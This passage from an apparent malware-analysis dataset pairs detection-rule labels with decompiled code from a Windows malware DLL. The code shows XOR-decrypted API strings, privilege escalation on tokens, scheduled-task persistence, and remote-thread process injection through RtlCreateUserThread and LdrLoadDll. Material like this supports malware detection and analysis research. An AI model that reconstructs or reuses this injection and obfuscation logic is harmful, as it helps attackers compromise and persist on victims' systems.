0x76423830;\n    var_24h = 0x33447a65;\n    fcn.00401000(0x14);\n    iVar8 = var_2ch;\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_2ch;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_14h - var_2ch];\n    } while (uVar6 < 0x14);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x179);\n    fcn.0040d022();\n    var_20h = 0x1a2e543d;\n    var_1ch = 0x112c2a21;\n    var_18h = 0xa00483d;\n    var_14h = 0x1731272b;\n    var_10h = 0x3035822;\n    var_ch._0_1_ = 0x14;\n    var_ch._1_1_ = 0x39;\n    var_ch._2_1_ = 0x31;\n    var_ch._3_1_ = 2;\n    var_8h._0_1_ = 7;\n    var_8h._1_1_ = 0x5d;\n    var_8h._2_1_ = 8;\n    var_8h._3_1_ = 0xf;\n    var_4h._0_1_ = 0x21;\n    var_4h._1_1_ = 0x4b;\n    var_28h = 0x686d316e;\n    var_24h = 0x74584b44;\n    fcn.00401000(0x1e);\n    iVar7 = var_2ch;\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_2ch;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_28h + uVar4) ^ puVar1[&var_20h - var_2ch];\n    } while (uVar6 < 0x1e);\n    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > GrantAllPossiblePrivelegesToToken : decrypt (char) %s -> %s\", 0x17c);\n    fcn.0040d022();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar3)(0, iVar8);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_58h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_c0h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_68h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_e4h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_90h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_48h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_88h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_a0h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_e0h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_c8h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_b8h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_a4h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_bch);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_dch);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_38h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_78h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_94h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_40h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_a8h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_50h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_b0h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_d8h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_60h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_d0h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_98h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_9ch);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_70h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_ach);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_b4h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_80h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_c4h);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_cch);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_d4h);\n    (*pcVar2)(uVar5);\n    return;\n}\n",
        "token_count": 16525
    },
    "0040d47d": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040d47d(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    uint32_t unaff_EBX;\n    char *lpString;\n    uint arglist;\n    int32_t iStack124;\n    ushort uStack120;\n    ushort uStack118;\n    ushort uStack116;\n    uint uStack114;\n    uint uStack110;\n    ushort uStack106;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar auStack88 [20];\n    ushort uStack68;\n    uchar auStack66 [2];\n    ushort uStack64;\n    ushort uStack62;\n    ushort uStack60;\n    ushort uStack52;\n    ushort uStack50;\n    uint uStack48;\n    uint uStack44;\n    uint uStack36;\n    ushort uStack32;\n    \n    uStack120 = 0;\n    uStack118 = 0;\n    iVar1 = (**(*param_1 + 0xc))(param_1, &uStack120, &uStack116);\n    if (iVar1 < 0) {\n        arglist = 0x115;\n        lpString = \"GTK DLL: task_sheduler.cpp:%d > CreatePeriodicTrigger : [ITask.CreateTrigger failed][0x%x]\";\n    }\n    else {\n        iStack124 = 0;\n        uStack120 = 0;\n        uStack118 = 0;\n        (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&iStack124);\n        piVar2 = unaff_EBX + 3000000000;\n        iStack124 = iStack124 + (0x4d2fa1ff < unaff_EBX);\n        puVar3 = fcn.0040d41a(auStack88);\n        uStack104 = *puVar3;\n        uStack100 = puVar3[1];\n        uStack96 = puVar3[2];\n        uStack92 = puVar3[3];\n        uStack120 = 0;\n        uStack118 = 0;\n        uStack116 = 0;\n        uStack114 = 0;\n        uStack110 = 0;\n        uStack106 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_SystemTimeToTzSpecificLocalTime)(0, &uStack104, &uStack120);\n        if (iVar1 < 0) {\n            arglist = 0x11e;\n            lpString = \n            \"GTK DLL: task_sheduler.cpp:%d > CreatePeriodicTrigger : [SystemTimeToTzSpecificLocalTime failed][0x%x]\";\n        }\n        else {\n            sub.ntdll.dll_memset(auStack66, 0, 0x2e);\n            uStack48 = 0x5a0;\n            uStack68 = 0x30;\n            uStack64 = uStack116;\n            uStack62 = uStack114;\n            uStack60 = uStack110;\n            uStack52 = uStack110._2_2_;\n            uStack50 = 0;\n            uStack36 = 1;\n            uStack32 = 1;\n            uStack44 = 1;\n            iVar1 = (**(*piVar2 + 0xc))(piVar2, &uStack68);\n            if (-1 < iVar1) {\n                return 0;\n            }\n            arglist = 0x136;\n            lpString = \"GTK DLL: task_sheduler.cpp:%d > CreatePeriodicTrigger : [ITaskTrigger.SetTrigger failed][0x%x]\";\n        }\n    }\n    fcn.00403bde(lpString, arglist);\n    return iVar1;\n}\n",
        "token_count": 831
    },
    "00403ab2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403ab2(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 236
    },
    "0040797b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040797b(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char *lpString;\n    uint uVar3;\n    uint nSize;\n    \n    iVar2 = 0;\n    nSize = param_1;\n    fcn.00403bde(\"GTK DLL: globals.cpp:%d > InitGlobals : [ENTERED]\", 0x11d);\n    *0x427d7c = param_1;\n    *0x427d80 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((param_2 & 1) != 0) {\n        *0x427d48 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    }\n    if ((param_2 & 2) != 0) {\n        *0x427d38 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    }\n    fcn.0040ac84();\n    fcn.0040790a();\n    if ((param_2 & 4) != 0) {\n        iVar2 = fcn.0040c06a();\n        if (iVar2 == 0) goto code_r0x00407a0a;\n        uVar3 = 0x134;\ncode_r0x004079f8:\n        lpString = \"GTK DLL: globals.cpp:%d > InitGlobals : PsSupGetModulePath failed with status %u.\";\ncode_r0x004079fd:\n        fcn.00403bde(lpString, uVar3);\n        goto code_r0x00407b64;\n    }\ncode_r0x00407a0a:\n    if ((param_2 & 0x88) != 0) {\n        iVar2 = fcn.0040c06a();\n        if (iVar2 != 0) {\n            uVar3 = 0x13d;\n            goto code_r0x004079f8;\n        }\n    }\n    if ((param_2 & 0x20) != 0) {\n        *0x427d74 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (*0x427d74 != 0) {\n            (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(*0x427d74, 0x427d70);\n        }\n    }\n    if ((param_2 & 0x10) != 0) {\n        *0x427d4c = (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 1, 0, 0);\n        if (*0x427d4c == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = 0x14a;\n            lpString = \n            \"GTK DLL: globals.cpp:%d > InitGlobals : Globals: Initializing AppShutdownEvent failed with status %u.\";\n            goto code_r0x004079fd;\n        }\n    }\n    if ((param_2 & 0x40) != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x20);\n        *0x427d60 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (*0x427d60 != 0) {\n            nSize = 0x10;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x427d60, &nSize);\n            if (iVar1 == 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x427d60, L\"UNKNOW\");\n            }\n            fcn.0040759a();\n            fcn.00403bde(\"GTK DLL: globals.cpp:%d > InitGlobals : Globals: Initializing PCName %S.\", 0x15a);\n        }\n    }\n    if ((param_2 & 0x100) != 0) {\n        iVar1 = fcn.00407b87();\n        if (iVar1 == 0) {\n            iVar1 = fcn.00407c05();\n            *0x427d68 = 2 - (iVar1 != 0);\n        }\n        else {\n            if (5 < *0x427d48) {\n                iVar1 = fcn.00407d4b();\n                if (iVar1 == 0) {\n                    *0x427d68 = 3;\n                    goto code_r0x00407b27;\n                }\n            }\n            *0x427d68 = 4;\n        }\n    }\ncode_r0x00407b27:\n    if ((param_2 & 0x200) != 0) {\n        if (*0x427d48 < 6) {\n            *0x427d64 = 2;\n        }\n        else {\n            *0x427d64 = fcn.00407c7d();\n        }\n    }\n    if (param_2 < '\\0') {\n        *0x427d6c = fcn.0040787f();\n    }\ncode_r0x00407b64:\n    if (iVar2 != 0) {\n        fcn.00407557();\n    }\n    fcn.00403bde(\"GTK DLL: globals.cpp:%d > InitGlobals : [LEAVED]\", 0x17f);\n    return iVar2;\n}\n",
        "token_count": 1170
    },
    "00408c09": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408c09(int32_t *arg_8h, int32_t lpStartAddress, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t *unaff_EBX;\n    int32_t iVar12;\n    int32_t *piVar13;\n    int64_t iVar14;\n    char *pcVar15;\n    uint uVar16;\n    char *pcVar17;\n    uint uVar18;\n    int32_t *piStack124;\n    int32_t iStack120;\n    uint uStack116;\n    uint uStack112;\n    int32_t *piStack108;\n    uchar *puStack104;\n    int32_t iStack100;\n    uint uStack96;\n    uint uStack92;\n    uint32_t uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint32_t uStack60;\n    uint uStack56;\n    int32_t *piStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar uStack32;\n    uchar uStack31;\n    uchar uStack30;\n    uchar uStack29;\n    uint uStack28;\n    uint uStack24;\n    uchar uStack20;\n    uchar uStack19;\n    uchar uStack18;\n    uchar uStack17;\n    \n    uVar4 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    puStack104 = uVar4 & 0xff;\n    iStack100 = 0;\n    piVar13 = arg_8h + 1;\n    piStack108 = piVar13;\n    if (*piVar13 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        *piVar13 = 0;\n    }\n    iVar14 = CONCAT44(puStack104, uStack96);\n    piStack124 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x427d3c & 1) != 0)) {\n        if (puStack104 != 0x5) {\n            if ((*0x427df8 | *0x427dfc) == 0) {\n                uStack64 = 0x2853015c;\n                uStack60 = 0x250b1e29;\n                uStack56 = CONCAT22(uStack56._2_2_, 0x755e);\n                uStack76 = 0x44377532;\n                uStack72 = 0x496f3045;\n                fcn.00401000(10);\n                uVar4 = 0;\n                do {\n                    puVar1 = uVar4 + piStack108;\n                    uVar5 = uVar4 & 0x80000007;\n                    if (uVar5 < 0) {\n                        uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar4 = uVar4 + 1;\n                    *puVar1 = (&stack0xffffffb0)[uVar5] ^ puVar1[&stack0xffffffbc + -piStack108];\n                } while (uVar4 < 10);\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : decrypt (char) %s -> %s\"\n                             , 0x188);\n                uStack32 = 0x45;\n                uStack31 = 0x20;\n                uStack30 = 0x53;\n                uStack29 = 0x21;\n                uStack28 = 0x522b3428;\n                uStack24 = 0x3f3d6637;\n                uStack20 = 4;\n                uStack116 = 7;\n                uStack36 = 0x1b0d3907;\n                uStack19 = 0x39;\n                uStack18 = 0x53;\n                uStack17 = 0x45;\n                iStack100 = 0x58614d55;\n                uStack96 = CONCAT13(uStack96._3_1_, 0x324537);\n                fcn.00401000(0x14);\n                iVar12 = uStack96;\n                iVar9 = 0;\n                do {\n                    puVar1 = iVar9 + uStack96;\n                    iVar10 = iVar9 % iStack120;\n                    iVar9 = iVar9 + 1;\n                    *puVar1 = (&stack0xffffff98)[iVar10] ^ puVar1[&stack0xffffffd8 + -uStack96];\n                } while (iVar9 < 0x14);\n                pcVar15 = \"szRtlCreateUserThread_EncryptedStackedBuffer\";\n                uVar18 = 0x189;\n                pcVar17 = \"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : decrypt (char) %s -> %s\";\n                iVar9 = uStack96;\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : decrypt (char) %s -> %s\"\n                             , 0x189);\n                fcn.0040ba44(pcVar17, uVar18, pcVar15, iVar9);\n                *0x427df8 = fcn.0040bf79(iVar12);\n                pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar18 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar12);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar18);\n                uVar18 = (*pcVar3)(0, uStack112);\n                (*pcVar7)(uVar18);\n            }\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : rtlCreateUserThread at %p\", \n                         0x18e);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : pFunction at %p\", 399);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : pContext at %p\", 400);\n            if (*0x427df8 == 0) {\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Native RtlCreateUserThread not found.\"\n                             , 0x1ae);\n            }\n            else {\n                iVar12 = fcn.004103d0(*0x427df8, *0x427dfc, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n                if (-1 < iVar12) {\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Native RtlCreateUserThread returned success. Remote TID=%u\"\n                                 , 0x1a4);\n                    uVar18 = 0;\n                    goto code_r0x00409642;\n                }\n                (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Native CreateRemoteThread failed (0x%x)\"\n                             , 0x1a9);\n            }\n            uVar18 = 0xffffffff;\n            goto code_r0x00409642;\n        }\n        uStack112 = 7;\n        if ((*0x427e00 | *0x427e04) == 0) {\n            fcn.0040ba44();\n            uStack64 = 0x2853015c;\n            uStack60 = 0x250b1e29;\n            uStack56 = CONCAT22(uStack56._2_2_, 0x755e);\n            uStack88 = 0x44377532;\n            uStack84 = 0x496f3045;\n            fcn.00401000(10);\n            uVar4 = 0;\n            do {\n                puVar1 = uVar4 + piStack124;\n                uVar5 = uVar4 & 0x80000007;\n                if (uVar5 < 0) {\n                    uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n                }\n                uVar4 = uVar4 + 1;\n                *puVar1 = (&stack0xffffffa4)[uVar5] ^ puVar1[&stack0xffffffbc + -piStack124];\n            } while (uVar4 < 10);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : decrypt (char) %s -> %s\", \n                         0x145);\n            uStack68 = 0x183b141a;\n            uStack64 = 0x1252293d;\n            uStack60 = uStack60 & 0xff000000 | 0x54251c;\n            uVar18 = 0xb;\n            uStack92 = 0x54497056;\n            uStack88 = uStack88 & 0xff000000 | 0x364852;\n            fcn.00401000(0xb);\n            piVar13 = piStack124;\n            iVar12 = 0;\n            do {\n                puVar1 = iVar12 + piStack124;\n                iVar9 = iVar12 % iStack120;\n                iVar12 = iVar12 + 1;\n                *puVar1 = (&stack0xffffffa0)[iVar9] ^ puVar1[&stack0xffffffb8 + -piStack124];\n            } while (iVar12 < 0xb);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : decrypt (char) %s -> %s\", \n                         0x146);\n            piVar8 = unaff_EBX;\n            iVar14 = fcn.0040bf79(piVar13);\n            if (iVar14 == 0) {\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Native LdrLoadDll not found.\"\n                             , 0x16e);\n                puStack104 = iVar14 >> 0x20;\n                uStack96 = iVar14;\n                uVar18 = 0xffffffff;\n            }\n            else {\n                uVar16 = 0x2c;\n                uStack40 = 0x41117a20;\n                uStack36 = 0x66053101;\n                uStack32 = 0x2e;\n                uStack31 = 0x7a;\n                uStack30 = 0x18;\n                uStack29 = 0x41;\n                uStack28 = 0x660a3111;\n                uStack24 = 0x41117a38;\n                uStack20 = 0x73;\n                uStack19 = 0x31;\n                uStack84 = 0x41747a4b;\n                uStack80 = 0x666b3173;\n                fcn.00401000(0x2c);\n                puStack104 = iVar14 >> 0x20;\n                uStack96 = iVar14;\n                uVar4 = 0;\n                do {\n                    puVar1 = uVar4 + piStack124;\n                    uVar5 = uVar4 & 0x80000007;\n                    if (uVar5 < 0) {\n                        uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar4 = uVar4 + 1;\n                    *puVar1 = (&stack0xffffffa8)[uVar5] ^ puVar1[&stack0xffffffd4 + -piStack124];\n                } while (uVar4 < 0x16);\n                piVar13 = piVar8;\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : decrypt (wide char) %s -> %ws\"\n                             , 0x153);\n                puStack104 = iVar14 >> 0x20;\n                uStack96 = iVar14;\n                iStack48 = piStack124 >> 0x1f;\n                piStack52 = piStack124;\n                piVar8 = piStack124;\n                do {\n                    iVar2 = *piVar8;\n                    piVar8 = piVar8 + 2;\n                } while (iVar2 != uStack112);\n                iVar2 = (piVar8 - (piStack124 + 2) >> 1) * 2;\n                uStack56 = 0;\n                uStack60 = CONCAT22(iVar2 + 2, iVar2);\n                iStack100 = fcn.004103d0(iStack100, piStack108, 4, 0, 0, 0, 0, 0, &stack0xffffffc4, \n                                         &stack0xffffffc4 >> 0x1f, &stack0xffffffb4, &stack0xffffffb4 >> 0x1f, uVar16, \n                                         uVar18);\n                puStack104 = iVar14 >> 0x20;\n                uStack96 = iVar14;\n                if (iStack100 < 0) {\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Native LdrLoadDll failed(0x%x)\"\n                                 , 0x168);\n                    puStack104 = iVar14 >> 0x20;\n                    uStack96 = iVar14;\n                    uVar16 = 0x40903a;\n                    uVar18 = (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(iStack100);\n                    puStack104 = iVar14 >> 0x20;\n                    uStack96 = iVar14;\n                }\n                else {\n                    uStack88 = 0x21100e11;\n                    uStack84 = 0x1b0c2015;\n                    uStack80 = uStack80 & 0xff000000 | 0x4f0718;\n                    piStack108 = 0x4f626b7a;\n                    puStack104 = puStack104 & 0xff000000 | 0x6e4c70;\n                    fcn.00401000(0xb);\n                    uVar4 = puStack104;\n                    iVar12 = -puStack104;\n                    iStack120 = 0;\n                    puStack104 = &stack0xffffffa4 + iVar12;\n                    do {\n                        puVar1 = iStack120 + uVar4;\n                        *puVar1 = (&stack0xffffff90)[iStack120 % 7] ^ puVar1[&stack0xffffffa4 + iVar12];\n                        iStack120 = iStack120 + 1;\n                    } while (iStack120 < 0xb);\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : decrypt (char) %s -> %s\"\n                                 , 0x15e);\n                    iStack48 = 0x724340e;\n                    uStack44 = 0x3d655340;\n                    uStack40 = 0x3352920;\n                    uStack36 = 0x3d455e60;\n                    uVar16 = 0x13;\n                    uStack32 = 0x2c;\n                    uStack31 = 0x22;\n                    uStack30 = 0x41;\n                    uStack92 = 0x6641464d;\n                    uStack88 = 0x58373634;\n                    fcn.00401000(0x13);\n                    piVar13 = piStack108;\n                    uVar5 = 0;\n                    do {\n                        puVar1 = uVar5 + piStack108;\n                        uVar6 = uVar5 & 0x80000007;\n                        if (uVar6 < 0) {\n                            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n                        }\n                        uVar5 = uVar5 + 1;\n                        *puVar1 = (&stack0xffffffa0)[uVar6] ^ puVar1[&stack0xffffffcc + -piStack108];\n                    } while (uVar5 < 0x13);\n                    fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : decrypt (char) %s -> %s\"\n                                 , 0x15f);\n                    *0x427e00 = fcn.0040bf79(piVar13);\n                    if (*0x427e00 != 0) {\n                        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Got native CreateRemoteThread address.\"\n                                     , 0x163);\n                    }\n                    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    unaff_EBX = NULL;\n                    uVar18 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar13);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar18);\n                    uVar18 = (*pcVar3)(0, uVar4);\n                    (*pcVar7)(uVar18);\n                    iVar14 = CONCAT44(puStack104, uStack96);\n                    uVar18 = 0xffffffff;\n                }\n                uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar16);\n                puStack104 = iVar14 >> 0x20;\n                uStack96 = iVar14;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                puStack104 = iVar14 >> 0x20;\n                uStack96 = iVar14;\n            }\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar13);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            puStack104 = iVar14 >> 0x20;\n            uStack96 = iVar14;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n            puStack104 = iVar14 >> 0x20;\n            uStack96 = iVar14;\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, unaff_EBX);\n            puStack104 = iVar14 >> 0x20;\n            uStack96 = iVar14;\n            (*pcVar7)(uVar16);\n            puStack104 = iVar14 >> 0x20;\n            uStack96 = iVar14;\n            piVar13 = piStack108;\n            if (*0x427e00 == 0) {\n                fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Native CreateRemoteThread not found.\"\n                             , 0x181);\n                puStack104 = iVar14 >> 0x20;\n                uStack96 = iVar14;\n                goto code_r0x00409642;\n            }\n        }\n        else {\n            uVar18 = 0xffffffff;\n        }\n        *0x427e04 = *0x427e00 >> 0x20;\n        iVar12 = fcn.004103d0(*0x427e00, *0x427e04, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, lpStartAddress, \n                              lpStartAddress >> 0x1f, lpParameter, lpParameter >> 0x1f);\n        puStack104 = iVar14 >> 0x20;\n        uStack96 = iVar14;\n        *piVar13 = iVar12;\n        if (iVar12 != 0) {\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Native CreateRemoteThread returned success. Remote TID=%u\"\n                         , 0x177);\n            puStack104 = iVar14 >> 0x20;\n            uStack96 = iVar14;\n            uVar18 = 0;\n            goto code_r0x00409642;\n        }\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puStack104 = iVar14 >> 0x20;\n        uStack96 = iVar14;\n        uVar16 = 0x17c;\n        pcVar17 = \n        \"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : Native CreateRemoteThread failed (0x%x)\";\n    }\n    else {\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : pFunction : %p\", 0x1b6);\n        fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : pContext : %p\", 0x1b7);\n        if (puStack104 != 0x5) {\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : injecting by _RtlCreateUserThread\"\n                         , 0x1d4);\n            uStack88 = 0x2853015c;\n            uStack84 = 0x250b1e29;\n            uStack80 = CONCAT22(uStack80._2_2_, 0x755e);\n            uStack76 = 0x44377532;\n            uStack72 = 0x496f3045;\n            fcn.00401000(10);\n            uVar4 = 0;\n            do {\n                puVar1 = uVar4 + piStack108;\n                uVar5 = uVar4 & 0x80000007;\n                if (uVar5 < 0) {\n                    uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n                }\n                uVar4 = uVar4 + 1;\n                *puVar1 = (&stack0xffffffb0)[uVar5] ^ puVar1[&stack0xffffffa4 + -piStack108];\n            } while (uVar4 < 10);\n            fcn.00403bde(\"GTK DLL: inject_image.cpp:%d > CreateRemoteThreadRemoteExecutor : decrypt (char) %s -> %s\", \n                         0x1e4);\n            uStack32 = 0x45;\n            uStack31 = 0x20;\n            uStack30 = 0x53;\n            uStack29 = 0x21;\n            uStack28 = 0x522b3428;\n            uStack24 = 0x3f3d6637;\n            uStack20 = 4;\n            uStack36 = 0x1b0d3907;\n            uStack19 = 0x39;\n            uStack18 = 0x53;\n            uStack17 = 0x45;\n            iStack100 = 0x58614d55;\n            uStack96 = CONCAT13(uStack96._3_1_, 0x324537);\n            fcn.00401000(0x14);\n            iVar9 = uStack96;\n            iVar10 = 0;\n            iVar12 = -uStack96;\n            uStack96 = &stack0xffffffd8 + iVar12;\n            do {\n                puVar1 = iVar10 + iVar9;\n                iVar11 